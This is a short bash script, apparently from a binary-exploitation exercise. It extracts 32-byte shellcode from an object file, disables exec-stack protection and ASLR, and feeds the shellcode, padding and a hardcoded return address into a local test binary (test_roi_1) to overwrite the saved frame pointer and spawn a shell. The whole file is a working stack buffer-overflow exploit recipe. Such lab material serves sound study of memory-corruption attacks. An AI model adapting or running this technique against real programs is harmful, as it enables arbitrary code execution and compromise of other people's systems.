#!/bin/bash
# Copyright (C) 2019 Giuliano Pasqualotto (github.com/giulianopa)
# This code is licensed under MIT license (see LICENSE.txt for details)
objdump -d gen_shell.o | sed -n '/needle0/,/needle1/p'

# Shellcode should be 32B long
echo $((0x21-0x00))
xxd -s0x44 -l32 -p gen_shell.o shellcode

# Make sure the shell code starts with a 'jmp 14 <there>' (eb0e)
cat shellcode

# Disable exec space protection
execstack -s test_roi_1

# Buffer address little endian (get from console output)
a=`printf %0x 0x7fffffffdd10 | tac -rs..`
echo $a

# Goal: overwrite saved RBP (setarch is to disable ASLR)
(( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat) | setarch `arch` -R ./test_roi_1
